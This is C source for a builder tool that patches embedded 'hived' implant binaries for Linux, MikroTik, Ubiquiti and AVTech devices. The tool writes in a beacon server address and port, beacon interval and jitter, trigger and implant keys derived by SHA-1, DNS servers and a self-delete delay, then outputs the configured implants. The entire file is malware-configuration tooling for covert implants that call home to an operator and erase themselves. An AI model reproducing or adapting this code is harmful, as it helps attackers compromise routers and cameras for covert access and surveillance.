#include <stdio.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include "trigger_protocols.h"

#include "_unpatched_linux_x86.h"
#include "_unpatched_mikrotik_x86.h"
#include "_unpatched_mikrotik_mips.h"
#include "_unpatched_mikrotik_ppc.h"
#include "_unpatched_ubiquiti_mips.h"
#include "_unpatched_avtech_arm.h"
#include "debug.h"
#include "string_utils.h"
#include "colors.h"

//PolarSSL Files
#include "polarssl/config.h"
#include "polarssl/sha1.h"

#define HIVE_LINUX_X86_FILE					"hived-linux-x86-PATCHED"
#define HIVE_MIKROTIK_X86_FILE				"hived-mikrotik-x86-PATCHED"
#define HIVE_MIKROTIK_MIPS_FILE				"hived-mikrotik-mips-PATCHED"
#define HIVE_MIKROTIK_PPC_FILE				"hived-mikrotik-ppc-PATCHED"
#define HIVE_UBIQUITI_MIPS_FILE				"hived-ubiquiti-mips-PATCHED"
#define HIVE_AVTECH_ARM_FILE				"hived-avtech-arm-PATCHED"

#define HIVE_LINUX_X86_UNPATCHED			"hived-linux-x86-UNpatched"
#define HIVE_MIKROTIK_X86_UNPATCHED			"hived-mikrotik-x86-UNpatched"
#define HIVE_MIKROTIK_MIPS_UNPATCHED		"hived-mikrotik-mips-UNpatched"
#define HIVE_MIKROTIK_PPC_UNPATCHED			"hived-mikrotik-ppc-UNpatched"
#define HIVE_UBIQUITI_MIPS_UNPATCHED		"hived-ubiquiti-mips-UNpatched"
#define HIVE_AVTECH_ARM_UNPATCHED			"hived-avtech-arm-UNpatched"

#define ID_KEY_FILE				"ID-keys.txt"
#define ID_KEY_DATETIME_FORMAT	"%4i/%02i/%02i %02i:%02i:%02i"
#define	SD_PATH_LENGTH			128		// This is also defined in server/self_delete.h

#define CREAT_MODE	S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH

#define OPTMATCH(o, s) ( strlen((o))==strlen((s)) && (strcmp((o),(s))== 0) )

//********************************************************************************

#define SIG_HEAD    				0x7AD8CFB6
#define DEFAULT_INITIAL_DELAY		3 * 60				// 3 minutes
#define DEFAULT_BEACON_PORT			443					// TCP port 443 (HTTPS)
#define DEFAULT_BEACON_INTERVAL		0					// operators did not want a default value
#define DEFAULT_TRIGGER_DELAY		60					// 60 seconds
#define DEFAULT_BEACON_JITTER		3					// Default value is 3, range is from 0<=jitter<=30
#define DEFAULT_SELF_DELETE_DELAY	60 * 24 * 60 * 60	// Default value is 60 days...

typedef enum {FALSE=0, TRUE} boolean;

struct __attribute__ ((packed)) cl_args {
	unsigned int	sig;
	unsigned int	beacon_port;
	unsigned int	trigger_delay;
	unsigned long	init_delay;
	unsigned int	interval;
	unsigned int	jitter;
	unsigned long	delete_delay;
	unsigned int	patched;
	unsigned char   idKey[ID_KEY_HASH_SIZE];
	char			sdpath[SD_PATH_LENGTH];
	char			beacon_ip[256];
	char			dns[2][16];
};

struct cl_args	args = {
						SIG_HEAD,
						DEFAULT_BEACON_PORT,
						DEFAULT_TRIGGER_DELAY,
						DEFAULT_INITIAL_DELAY,
						DEFAULT_BEACON_INTERVAL,
						DEFAULT_BEACON_JITTER,
						DEFAULT_SELF_DELETE_DELAY,
						1,
						{0},
						{0},
						{0},
						{{0}}
};

//********************************************************************************

//define displaySha1Hash function
void printSha1Hash(FILE *file, char *tag, unsigned char *sha1Hash)
{
	int i = 0;

	fprintf(file, tag);
	//Display 40 hexadecimal number array
	for (i = 0; i < ID_KEY_HASH_SIZE; i++)
		fprintf(file, "%02x", sha1Hash[i]);
}

//********************************************************************************
int user_instructions(void);
int patch(char *filename, unsigned char *hexarray, unsigned int arraylen, struct cl_args patched_args);
int non_patch(char *filename, unsigned char *hexarray, unsigned int arraylen);

//********************************************************************************
int usage(char **argv)
{
	printf("\n");
	fprintf(stdout, "  %sUsage:%s\n", BLUE, RESET);
	fprintf(stdout, "  %s [-a <address>] [-d <b_delay>] [-i <interval>] (-k <idKey> | -K <idKeyFile>) [-S <DNS address>] [-p <port>] [-t <t_delay>] [-m <OS>] \n\n", *argv);
	fprintf(stdout, "    %s-a <address>%s       - IP address or hostname of beacon server\n", GREEN, RESET);
	fprintf(stdout, "    %s-d <b_delay>%s       - initial delay before first beacon (in seconds), 0 for no beacons.\n", GREEN, RESET);
	fprintf(stdout, "    %s-i <interval>%s      - beacon interval (in seconds)\n", GREEN, RESET);
	fprintf(stdout, "    %s-K <idKeyFile>%s     - ID key filename (maximum 100 character path)\n", GREEN, RESET);
	fprintf(stdout, "    %s-k <ID Key Phrase>%s - ID key phrase (maximum 100 character string)\n", GREEN, RESET);
	fprintf(stdout, "    %s-j <b_jitter>%s      - beacon jitter (integer of percent variance between 0 and 30 [0-30] )\n", GREEN, RESET);
	fprintf(stdout, "    %s-P <file path>%s     - (optional) self-delete control/log file directory path [default: /var]\n", GREEN, RESET);
	fprintf(stdout, "    %s-p <port>%s          - (optional) beacon port [default: 443]\n", GREEN, RESET);
	fprintf(stdout, "    %s-S <address>%s       - IP address of the DNS server(s) (required if beacon address a is domain name\n", GREEN, RESET);
	fprintf(stdout, "    %s-s <sd_delay>%s      - (optional) self delete delay since last successful trigger/beacon (in seconds) [default: 60 days]\n", GREEN, RESET);
	fprintf(stdout, "    %s-t <t_delay>%s       - (optional) delay between trigger received & callback +/- 30 sec (in seconds) [default: 60 sec]\n", GREEN, RESET);
	fprintf(stdout, "    %s-m <OS>%s            - (optional) target OS [default: 'all'].  options:\n", GREEN, RESET);
	fprintf(stdout, "                             * 'all' - default\n");
	fprintf(stdout, "                             * 'raw' - all unpatched\n");
	fprintf(stdout, "                             * 'mt-x86'\n");
	fprintf(stdout, "                             * 'mt-mips'\n");
	fprintf(stdout, "                             * 'mt-ppc'\n");
	fprintf(stdout, "                             * 'linux-x86'\n");
	fprintf(stdout, "                             * 'ub-mips'\n");
	fprintf(stdout, "                             * 'avt-arm'\n");
	fprintf(stdout, "    %s[-h ]%s              - print this usage\n\n", GREEN, RESET);
//   fprintf(stdout, "  %sExamples:%s\n", BLUE, RESET);
//   fprintf( stdout, "   Coming soon!\n\n" );
	printf("\n");
	return 0;
}

//********************************************************************************
int RandFill(char *buf, int size)
{
	int i;
	static int srand_set;

	if (srand_set != 1) {
		srand(time(NULL));
		srand_set = 1;
	}

	for (i = 0; i < size; i++) {
		buf[i] = (char) (rand() % 255);
	}

	return 0;
}

//********************************************************************************
int main(int argc, char **argv)
{
	int				optval;
	int				linux_x86 = 0;					// Linux x86
	int 			mikrotik_x86 = 0;				// MikroTik x86
	int 			mikrotik_mips = 0;				// MikroTik MIPS Big Endian
	int 			mikrotik_ppc = 0;				// MikroTik PowerPC [Big Endian]
	int 			ubiquiti_mips = 0;				// Ubiquiti MIPS Big Endian
	int 			avtech_arm = 0;					// AVTech ARM
	int 			raw = 0;						// unpatched versions

	char 			*host = (char *) NULL;			// cached hostname for user confirmation message
	FILE 			*implantIDFile;					// Used to save implant keys and subsequent sha1 hashes...
	time_t 			currentTime;					// Time stamp for ID key generation
	struct tm 		*idKeyTime;						// Pointer to the ID key generation data structure
	unsigned char	implantKey[ID_KEY_HASH_SIZE];
	unsigned char	triggerKey[ID_KEY_HASH_SIZE];
	boolean			keyed = FALSE;					// Boolean to verify that a key was entered

	implantKey[0] = '\0';
	args.sig = SIG_HEAD;

	while ((optval = getopt(argc, argv, "+a:d:hI:i:j:K:k:m:P:p:S:s:t:")) != -1) {
		switch (optval) {

		case 'a':	// Hostname / IP address of beacon LP
			if (strlen(optarg) >= sizeof(args.beacon_ip)) {
				printf(" ERROR: Hostname or IP exceeds %d character limit\n", (int)sizeof(args.beacon_ip));
				return -1;
			}
			host = optarg;	// Save domain name or IP address for processing below
			break;

		case 'd':	// initial delay
			args.init_delay = strtoul(optarg, NULL, 10);
			break;

		case 'h':	// Help
			usage(argv);
			break;

		case 'i':	// beacon interval
			args.interval = (unsigned int) atoi(optarg);
			break;

		case 'j':	// beacon jitter
			args.jitter = (unsigned int) atoi(optarg);
			break;

			// The implant key is generated from the SHA-1 hash of the SHA-1 hash of the text entered
			// on the command line (-k option), or by reading the contents of the key file (using the -K option).
		case 'K':
			{	struct stat	statbuf;

				if (implantKey[0] != '\0') {	// Ensure that both -k and -K options aren't used together.
					fprintf(stderr, "ERROR: Only one key option (-k or -K) can be used.\n");
					return -1;
				}

				if (access(optarg, R_OK)) {
					fprintf( stderr, "Key file \"%s\" not found or not readable.\n", optarg);
					return -1;
				}
				if (stat(optarg, &statbuf) != 0) {
					perror("Cannot obtain key file attributes.");
					return -1;
				}

				implantIDFile = fopen(ID_KEY_FILE, "a+");	// Open file to save implant keys and associated SHA1 hashes
				if (implantIDFile == NULL) {
					printf("Unable to save implantID information into the idKeys.txt file.\n");
					return -1;
				}

				currentTime = time(NULL);
				idKeyTime = gmtime(&currentTime);

				if (statbuf.st_size >= ID_KEY_LENGTH_MIN) { 	// Validate that the key text in the file is of sufficient length
					fprintf(implantIDFile, ID_KEY_DATETIME_FORMAT "\tFILE: %s",	// Record the ID key time and text
					idKeyTime->tm_year + 1900, idKeyTime->tm_mon + 1, idKeyTime->tm_mday,
					idKeyTime->tm_hour, idKeyTime->tm_min, idKeyTime->tm_sec,  optarg);
					sha1_file((const char *)optarg, triggerKey);		// Generate the trigger key from the key file
					D(printSha1Hash (stdout, "Trigger Key", triggerKey));

					sha1(triggerKey, ID_KEY_HASH_SIZE, implantKey);		// Generate the implant key
					printSha1Hash(implantIDFile, "\t", triggerKey);
					printSha1Hash(implantIDFile, "\t", implantKey);		// Record the implant key

					fprintf(implantIDFile, "\n");				// Close the record file
					fclose(implantIDFile);
					D(printSha1Hash (stdout, "Implant Key", implantKey));
					D(printf("\n\n\n" ));
				} else {
					fprintf(stderr, "ERROR: ID key length must be at least %i characters\n", ID_KEY_LENGTH_MIN);
					return -1;
				}
				memcpy(args.idKey, implantKey, sizeof(args.idKey));		// Copy the implant key to the patched args
				keyed = TRUE;
				break;
			}

		case 'k':

			if (implantKey[0] != '\0') {	// Ensure that both -k and -K options aren't used together.
				fprintf(stderr, "ERROR: Only one key option (-k or -K) can be used.\n");
				return -1;
			}

			if (strlen(optarg) < ID_KEY_LENGTH_MIN) {
				fprintf(stderr, "ERROR: ID key length must be at least %i characters\n", ID_KEY_LENGTH_MIN);
				return -1;
			}

			implantIDFile = fopen(ID_KEY_FILE, "a+");	// Open file to save implant keys and associated SHA1 hashes
			if (implantIDFile == NULL) {
				printf("Unable to save implantID information into the idKeys.txt file.\n");
				return -1;
			}

			currentTime = time(NULL);
			idKeyTime = gmtime(&currentTime);
			fprintf(implantIDFile, ID_KEY_DATETIME_FORMAT "\t%s",			// Record the ID key time and text
				idKeyTime->tm_year + 1900, idKeyTime->tm_mon + 1, idKeyTime->tm_mday,
				idKeyTime->tm_hour, idKeyTime->tm_min, idKeyTime->tm_sec,  optarg);
			D(printf("\n\n\n DEBUG: keyPhrase=%s \n", optarg));

			sha1((const unsigned char *) optarg, strlen(optarg), triggerKey);	// Compute trigger key
			D(printSha1Hash(stdout, "Trigger Key", triggerKey));
			printSha1Hash(implantIDFile, "\t", triggerKey);				// Record the trigger key

			sha1(triggerKey, ID_KEY_HASH_SIZE, implantKey);				// Compute implant key
			D(printSha1Hash(stdout, "Implant Key", implantKey));
			D(printf("\n\n\n"));
			printSha1Hash(implantIDFile, "\t", implantKey);				// Record the implant key

			fprintf(implantIDFile, "\n");						// Close the record file
			fclose(implantIDFile);
			memcpy(args.idKey, implantKey, sizeof(args.idKey));			// Copy the implant key to the patched args
			keyed = TRUE;
			break;

		case 'm':	// operating system: valid Linux, all, or raw

			do {
				if (OPTMATCH(optarg, "mt-ppc"))		{mikrotik_ppc = 1;		break;}
				if (OPTMATCH(optarg, "mt-mips"))	{mikrotik_mips = 1;		break;}
				if (OPTMATCH(optarg, "mt-mipsbe"))	{mikrotik_mips = 1;		break;}
				if (OPTMATCH(optarg, "mt-x86"))		{mikrotik_x86 = 1;		break;}
				if (OPTMATCH(optarg, "linux-x86"))	{linux_x86 = 1;			break;}
				if (OPTMATCH(optarg, "ub-mips"))	{ubiquiti_mips = 1;		break;}
				if (OPTMATCH(optarg, "avt-arm"))	{avtech_arm = 1;		break;}
				if (OPTMATCH(optarg, "raw"))		{raw = 1;				break;}

				if (OPTMATCH(optarg, "all"))		{linux_x86 = 1,
													mikrotik_x86 = 1,
													mikrotik_mips = 1,
													mikrotik_ppc = 1,
													ubiquiti_mips = 1;
													avtech_arm = 1;
																			break;}
				printf(" ERROR: Invalid architecture specified\n");
				return -1;
			} while (0);
			break;

		case 'P':	// Set path for self-delete control and log files
			if (strlen(optarg) + 9 < SD_PATH_LENGTH) {	// Make sure array is large enough for filename, '/' and '\0'
				strcpy(args.sdpath, optarg);			// Copy the path from the command line
			} else {
				fprintf(stderr, "ERROR: Directory path is too long (maximum 120 characters)");
				return -1;
			}
			break;

		case 'p':	// beacon port
			args.beacon_port = (unsigned int) atoi(optarg);
			if (args.beacon_port < 1 || args.beacon_port > 65535) {
				printf("ERROR: Invalid port number for beacon\n");
				return -1;
			}
			break;

		case 'S':	// DNS Server address(es) -- a comma separated list of up to two dotted quad addresses
			{
				char *dns;
				char *address_list;

				address_list = strdup(optarg);

				// Get 1st DNS server address and validate its length
				if ((dns = strtok(address_list, ","))) {
					if (strlen(dns) > 16) {
						fprintf(stderr, "ERROR: DNS server address too long -- must be in dotted quad format (e.g. 192.168.53.53)\n");
						return -1;
					}
					memcpy(args.dns[0], dns, strlen(dns));
				} else {
					args.dns[0][0] = '\0';
					fprintf(stderr, "Missing DNS address\n");
					return -1;
				}

				// Get 2nd DNS server address if it was entered and validate its length
				if ((dns = strtok(NULL, ","))) {
					if (strlen(dns) > 16) {
						fprintf(stderr, "ERROR: Second DNS server address too long -- must be in dotted quad format (e.g. 192.168.53.53)\n");
						return -1;
					}
					memcpy(args.dns[1], dns, strlen(dns));
				} else
					args.dns[1][0] = '\0';
				free(address_list);
			}
			break;

		case 's':	// self delete delay
			args.delete_delay = strtoul(optarg, NULL, 10);
			break;

		case 't':	// trigger delay
			args.trigger_delay = (unsigned int) atoi(optarg);
			break;

		default:
			printf(" ERROR: Invalid option or option requires a parameter\n");
			return -1;
			break;
		}
	}

	if (raw == 1) {
		printf("\nCreating raw unpatched binaries for all supported architectures...\n\n");

		remove(HIVE_LINUX_X86_UNPATCHED);
		remove(HIVE_MIKROTIK_X86_UNPATCHED);
		remove(HIVE_MIKROTIK_MIPS_UNPATCHED);
		remove(HIVE_MIKROTIK_PPC_UNPATCHED);
		remove(HIVE_UBIQUITI_MIPS_UNPATCHED);
		remove(HIVE_AVTECH_ARM_UNPATCHED);

		non_patch(HIVE_LINUX_X86_UNPATCHED, hived_linux_x86_unpatched, hived_linux_x86_unpatched_len);
		non_patch(HIVE_MIKROTIK_X86_UNPATCHED, hived_mikrotik_x86_unpatched, hived_mikrotik_x86_unpatched_len);
		non_patch(HIVE_MIKROTIK_MIPS_UNPATCHED, hived_mikrotik_mips_unpatched, hived_mikrotik_mips_unpatched_len);
		non_patch(HIVE_MIKROTIK_PPC_UNPATCHED, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len);
		non_patch(HIVE_UBIQUITI_MIPS_UNPATCHED, hived_ubiquiti_mips_unpatched, hived_ubiquiti_mips_unpatched_len);
		non_patch(HIVE_AVTECH_ARM_UNPATCHED, hived_avtech_arm_unpatched, hived_avtech_arm_unpatched_len);
		printf("done.\n\n");
		return 0;
	}

	if (! keyed) {		// Verify that a key was supplied
		printf("\n    %sERROR: Key missing%s\n ", RED, RESET);
		usage(argv);
		return -1;
	}

	{	// Validate IP addressing - must have a valid IP or a domain name
		uint32_t	beaconIPaddr = 0;

		if (args.init_delay > 0) {			// Beacons enabled

			if (args.beacon_port == 0) {
				DLX(1, printf("No Beacon Port Specified!\n"));
				DLX(1, printUsage(argv[0]));
			}

			// Obtain Beacon IP address
			if (strlen(host) == 0) {
					DLX(1, printf("No Beacon IP address specified!\n"));
					DLX(1, printUsage(argv[0]));
					return -1;
			}

			RandFill(args.beacon_ip, sizeof(args.beacon_ip));	// Fill/initialize field with random data
			strcpy(args.beacon_ip, host);						// Copy string representation of hostname or IP into the field including the null byte
			if (inet_pton(AF_INET, args.beacon_ip, &beaconIPaddr) <= 0) {		// Determine if beacon IP is a valid address
				if (args.dns[0] == NULL) {										// If not, verify that a DNS server address was specified
					DLX(1, printf("Beacon IP was specified as a domain name, but no valid DNS server address was specified to resolve the name!\n"));
					return -1;
				}
			}
		}
	}


	if (args.init_delay > 0) {			// Beacons enabled
		if ((args.beacon_port == 0) || (args.interval == 0) || (strlen(args.beacon_ip) == 0)) {
			printf("\n");
			printf("    %sERROR: Incomplete options%s\n", RED, RESET);
			usage(argv);
			return -1;
		}
		// Enforce 0 <= jitter <= 30 requirement.
		if (((int) args.jitter < 0) || (args.jitter > 30)) {
			printf("\n");
			printf("    %sError: Incorrect options%s\n", RED, RESET);
			usage(argv);
			return -1;
		}
	}

	if (	(linux_x86 == 0) &&
			(mikrotik_x86 == 0) &&
			(mikrotik_mips == 0) && (mikrotik_ppc == 0) &&
			(ubiquiti_mips == 0) &&
			(avtech_arm == 0)
			) {	// no OS was selected, so default is to build all
				linux_x86 = 1;
				mikrotik_x86 = 1;
				mikrotik_mips = 1;
				mikrotik_ppc = 1;
				ubiquiti_mips = 1;
				avtech_arm = 1;
	}

	printf("\n");
	printf("  This application will generate PATCHED files with the following values:\n\n");
	printf("\t%32s: %-s\n", "Primary DNS Server IP address", args.dns[0]);
	printf("\t%32s: %-s\n", "Secondary DNS Server IP address", args.dns[1]);
	printf("\t%32s: ", "Trigger Key"); printSha1Hash(stdout, "", triggerKey); printf("\n");
	printf("\t%32s: ", "Implant Key"); printSha1Hash(stdout, "", implantKey); printf("\n");
	if (args.init_delay > 0) {
		printf("\n\t%32s: %-s\n", "Beacon Server IP address", host);
		printf("\t%32s: %-d\n", "Beacon Server Port number", args.beacon_port);
		printf("\t%32s: %-lu\n", "Beacon Initial Delay (sec)", args.init_delay);
		printf("\t%32s: %-d\n", "Beacon Interval (sec)", args.interval);
		printf("\t%32s: %-d\n", "Beacon Jitter (%)", args.jitter);
	} else {
		printf("\n\t%32s\n", "Beacons Disabled");
	}
	printf("\n\t%32s: %-lu\n", "Self Delete Delay (sec)", args.delete_delay);
	printf("\t%32s: %-s\n", "Self Delete Control File Path", args.sdpath);
	printf("\t%32s: %-d\n", "Trigger Delay (+/-30 sec)", args.trigger_delay);


	printf("\n  Target Operating Systems:\n");

	// little endian systems targets

	if (linux_x86 == 1)		printf("   . Linux/x86\n");
	if (mikrotik_x86 == 1)	printf("   . MikroTik/x86\n");
	if (mikrotik_mips == 1)	printf("   . MikroTik/MIPS\n");
	if (mikrotik_ppc == 1)	printf("   . MikroTik/PPC\n");
	if (ubiquiti_mips == 1)	printf("   . Ubiquiti/MIPS\n");
	if (avtech_arm == 1)	printf("   . AVTech/ARM\n");

	cl_string((unsigned char *) args.dns[0], sizeof(args.dns[0]));
	cl_string((unsigned char *) args.dns[1], sizeof(args.dns[1]));
	cl_string((unsigned char *) args.beacon_ip, sizeof(args.beacon_ip));
	cl_string((unsigned char *) args.sdpath, sizeof(args.sdpath));

	remove(HIVE_LINUX_X86_FILE);
	remove(HIVE_MIKROTIK_X86_FILE);
	remove(HIVE_MIKROTIK_MIPS_FILE);
	remove(HIVE_MIKROTIK_PPC_FILE);
	remove(HIVE_UBIQUITI_MIPS_FILE);
	remove(HIVE_AVTECH_ARM_FILE);


	sleep(1);

// We start as Little Endian.  If the binary is detected as Big Endian, then the structure
// is changed to Big Endian.  Since these changes are made in a global variable used by all
// parsers, check for Little Endian variants first and the Big Endian possibilities next.

	if (linux_x86 == 1)		patch(HIVE_LINUX_X86_FILE, hived_linux_x86_unpatched, hived_linux_x86_unpatched_len, args);
	if (mikrotik_x86 == 1)	patch(HIVE_MIKROTIK_X86_FILE, hived_mikrotik_x86_unpatched, hived_mikrotik_x86_unpatched_len, args);
	if (avtech_arm == 1)	patch(HIVE_AVTECH_ARM_FILE, hived_avtech_arm_unpatched, hived_avtech_arm_unpatched_len, args);
	if (mikrotik_ppc == 1)	patch(HIVE_MIKROTIK_PPC_FILE, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len, args);
	if (mikrotik_mips == 1)	patch(HIVE_MIKROTIK_MIPS_FILE, hived_mikrotik_mips_unpatched, hived_mikrotik_mips_unpatched_len, args);
	if (ubiquiti_mips == 1)	patch(HIVE_UBIQUITI_MIPS_FILE, hived_ubiquiti_mips_unpatched, hived_ubiquiti_mips_unpatched_len, args);
	printf("\n");

	return 0;
}

//********************************************************************************
int non_patch(char *filename, unsigned char *hexarray, unsigned int arraylen)
{
	int fd, ret;

	printf("\tGenerating %s file...", filename);

	fd = creat(filename, CREAT_MODE);
	if (fd < 0) {
		perror("create");
		exit(-1);
	}

	ret = write(fd, hexarray, arraylen);

	if ((unsigned int) ret != arraylen) {
		printf("FAILED\n\tWriting Server incomplete. Aborting.\n\n");
		exit(-1);
	}

	close(fd);

	printf(" ok\n");

	return 0;
}

//********************************************************************************
int patch(char *filename, unsigned char *hexarray, unsigned int arraylen, struct cl_args patched_args)
{
	unsigned int sig_head = SIG_HEAD;
	uint32_t sig_head2 = ntohl(SIG_HEAD);
	unsigned char *p;
	int fd, ret = 1;
	unsigned int cnt = 0;
	int big_endian = 0;
	struct cl_args copy_of_args = patched_args;

	p = hexarray;
	cnt = 0;

	printf("\n");
	do {
		if (cnt > arraylen) {
			printf("\n\tPatch signature not found in %s. Aborting...\n\n", filename);
			exit(0);
			break;
		}
		// try #1 LITTLE ENDIAN
		// TODO: once the first big endian target is found and the structure is swapped to 
		// big endian, I think all successive BIG ENDIAN targets are actually matching 
		// against the LITTLE ENDIAN rules.  it works, but could be problematic in the future
		ret = memcmp((unsigned int *) p, &sig_head, sizeof(SIG_HEAD));

		// try #2 BIG ENDIAN
		if (ret != 0) {
			ret = memcmp((unsigned int *) p, &sig_head2, sizeof(SIG_HEAD));
			if (ret == 0)
				big_endian = 1;
		}

		p++;
		cnt++;
	} while (ret != 0);

	printf("  SIG_HEAD found at offset 0x%x for %s\n", (int)(--p - hexarray), filename);

	if (big_endian == 0) {
		memcpy(p, &copy_of_args, sizeof(struct cl_args));
	} else if (big_endian == 1) {
		copy_of_args.sig = htonl(copy_of_args.sig);
		copy_of_args.beacon_port = htonl(copy_of_args.beacon_port);
		copy_of_args.init_delay = htonl(copy_of_args.init_delay);
		copy_of_args.interval = htonl(copy_of_args.interval);
		copy_of_args.jitter = htonl(copy_of_args.jitter);
		copy_of_args.trigger_delay = htonl(copy_of_args.trigger_delay);
		copy_of_args.delete_delay = htonl(copy_of_args.delete_delay);
		copy_of_args.patched = htonl(copy_of_args.patched);

		memcpy(p, &copy_of_args, sizeof(struct cl_args));
	}

	/* write out the patched file */
	printf("  Generating %s file...", filename);

	fd = creat(filename, CREAT_MODE);
	if (fd < 0) {
		perror("creat");
		exit(-1);
	}

	ret = write(fd, hexarray, arraylen);

	if ((unsigned int) ret != arraylen) {
		printf("FAILED\n  Writing Server incomplete.  Aborting.\n\n");
		exit(-1);
	}

	close(fd);

	printf(" done\n");

	return 0;
}
